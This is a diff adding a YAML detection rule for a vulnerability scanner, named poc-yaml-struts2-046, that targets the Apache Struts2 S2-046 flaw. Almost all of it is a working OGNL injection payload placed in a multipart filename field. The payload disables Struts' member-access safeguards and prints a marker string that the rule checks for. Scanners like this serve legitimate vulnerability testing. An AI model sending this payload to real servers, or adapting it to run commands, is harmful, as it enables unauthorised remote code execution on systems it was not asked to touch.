@@ -1,0 +1,13 @@
+name: poc-yaml-struts2-046
+description: "执行命令输出字符串Rscan_check"
+alwaysExecute: true
+matchCount: 1
+rules:
+  - method: POST
+    path: /
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------
+    follow_redirects: true
+    body: "-----------------------------\r\nContent-Disposition:\x20form-data;\x20name=\"test\";\x20filename=\"%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(\'text/html;charset=UTF-8\')).(#res.getWriter().print(\'Rscan_\')).(#res.getWriter().print(\'check\')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b\"\r\nContent-Type:\x20text/plain\r\n\r\n\r\n-----------------------------"
+    expression:
+      body_all: ["Rscan_check"]
